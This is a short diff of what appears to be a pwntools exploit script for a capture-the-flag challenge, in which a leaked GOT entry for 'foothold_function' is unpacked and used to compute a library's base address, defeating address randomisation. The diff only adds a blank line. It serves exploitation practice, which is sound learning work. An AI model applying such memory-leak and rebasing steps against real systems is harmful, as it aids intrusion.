@@ -231,6 +231,7 @@ leaked_foothold_got = p.recvuntil(b'\n')
 leaked_foothold_got = leaked_foothold_got.replace(b'\n', b'')
 leaked_foothold_got = u64(leaked_foothold_got.ljust(8, b'\x00'))
 info('LEAKED FOOTHOLD GOT: %s' % hex(leaked_foothold_got))
+
 libelf.address = leaked_foothold_got - libelf.sym['foothold_function']
 info('FOUND FOOTHOLD BASE @ %s' % hex(libelf.address))
 ```
